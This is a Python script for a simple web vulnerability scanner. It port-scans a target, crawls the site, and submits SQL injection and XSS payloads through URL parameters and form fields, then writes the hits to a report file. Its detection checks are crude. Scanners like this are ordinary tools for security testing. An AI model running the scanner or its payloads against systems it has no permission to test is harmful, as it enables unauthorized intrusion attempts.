import socket
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore

# ---------------- GLOBALS ----------------
visited = set()
found_forms = []
results = []

COMMON_DIRS = ["admin", "login", "dashboard", "api"]
SQL_PAYLOADS = ["' OR '1'='1", "'--"]
XSS_PAYLOADS = ["<script>alert(1)</script>"]

# ---------------- URL NORMALIZE ----------------
def normalize_url(target):
    target = target.strip()
    target = target.replace("http://", "").replace("https://", "")
    return "http://" + target

# ---------------- RESOLVE ----------------
def resolve_target(target):
    try:
        return socket.gethostbyname(target)
    except:
        print(Fore.RED + "[ERROR] Invalid target")
        return None

# ---------------- PORT SCAN ----------------
def scan_port(ip, port):
    s = socket.socket()
    s.settimeout(1)
    if s.connect_ex((ip, port)) == 0:
        print(Fore.GREEN + f"[OPEN] {port}")
        return port
    s.close()

def scan_ports(ip):
    ports = [21,22,80,443,3306]
    open_ports = []

    with ThreadPoolExecutor(max_workers=50) as ex:
        res = ex.map(lambda p: scan_port(ip,p), ports)

    for r in res:
        if r:
            open_ports.append(r)
    return open_ports

# ---------------- PARAM EXTRACT ----------------
def extract_params(url):
    params = parse_qs(urlparse(url).query)
    if params:
        results.append(f"[PARAMS] {url} -> {list(params.keys())}")

# ---------------- FORM EXTRACT ----------------
def extract_forms(url):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")

        for form in soup.find_all("form"):
            action = form.get("action")
            method = form.get("method", "get").lower()

            inputs = []
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    inputs.append(name)

            form_data = {
                "url": url,
                "action": urljoin(url, action) if action else url,
                "method": method,
                "inputs": inputs
            }

            found_forms.append(form_data)

            print(Fore.YELLOW + f"[FORM] {form_data['action']}")

    except:
        pass

# ---------------- CRAWLER ----------------
def crawl(url, depth=2):
    if depth == 0 or url in visited:
        return []

    visited.add(url)
    urls = [url]

    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")

        extract_forms(url)
        extract_params(url)

        for link in soup.find_all("a", href=True):
            full = urljoin(url, link["href"]).split("#")[0]

            if urlparse(full).netloc == urlparse(url).netloc:
                urls += crawl(full, depth-1)

    except:
        pass

    return list(set(urls))

# ---------------- HEADER CHECK ----------------
def check_headers(url):
    try:
        r = requests.get(url)
        h = r.headers

        if "X-Frame-Options" not in h:
            results.append(f"[VULN] {url} Missing XFO")

        if "Content-Security-Policy" not in h:
            results.append(f"[VULN] {url} Missing CSP")
    except:
        pass

# ---------------- DIR BRUTE ----------------
def dir_scan(url):
    for d in COMMON_DIRS:
        try:
            r = requests.get(f"{url}/{d}")
            if r.status_code == 200:
                results.append(f"[DIR] {url}/{d}")
        except:
            pass

# ---------------- URL SQLi ----------------
def test_sqli(url):
    for p in SQL_PAYLOADS:
        try:
            r = requests.get(f"{url}?id={p}")
            if "sql" in r.text.lower():
                results.append(f"[SQLi] {url}")
        except:
            pass

# ---------------- URL XSS ----------------
def test_xss(url):
    for p in XSS_PAYLOADS:
        try:
            r = requests.get(f"{url}?q={p}")
            if p in r.text:
                results.append(f"[XSS] {url}")
        except:
            pass

# ---------------- FORM SUBMIT ----------------
def submit_form(form, payload):
    data = {inp: payload for inp in form["inputs"]}

    try:
        if form["method"] == "post":
            return requests.post(form["action"], data=data)
        else:
            return requests.get(form["action"], params=data)
    except:
        return None

# ---------------- FORM SQLi ----------------
def test_form_sqli():
    for form in found_forms:
        for p in SQL_PAYLOADS:
            r = submit_form(form, p)
            if r and "sql" in r.text.lower():
                results.append(f"[FORM SQLi] {form['action']}")
                break

# ---------------- FORM XSS ----------------
def test_form_xss():
    for form in found_forms:
        for p in XSS_PAYLOADS:
            r = submit_form(form, p)
            if r and p in r.text:
                results.append(f"[FORM XSS] {form['action']}")
                break

# ---------------- SCAN URL ----------------
def scan_url(url):
    print(Fore.CYAN + f"[SCAN] {url}")
    check_headers(url)
    dir_scan(url)
    test_sqli(url)
    test_xss(url)

# ---------------- MAIN ----------------
def run(target):
    print(Fore.YELLOW + f"\n🚀 Scanning {target}")

    target = target.replace("http://", "").replace("https://", "")
    ip = resolve_target(target)

    if not ip:
        return

    print(Fore.GREEN + f"[IP] {ip}")

    open_ports = scan_ports(ip)

    if 80 in open_ports or 443 in open_ports:
        base = normalize_url(target)

        urls = crawl(base, depth=2)

        print(Fore.BLUE + f"\n[+] URLs Found: {len(urls)}")
        print(Fore.BLUE + f"[+] Forms Found: {len(found_forms)}")

        with ThreadPoolExecutor(max_workers=20) as ex:
            ex.map(scan_url, urls)

        test_form_sqli()
        test_form_xss()

    # SAVE REPORT
    with open("report.txt", "w") as f:
        for r in results:
            f.write(r + "\n")

    print(Fore.GREEN + "\n✅ Scan Complete → report.txt")


if __name__ == "__main__":
    target = input("Target: ")
    run(target)
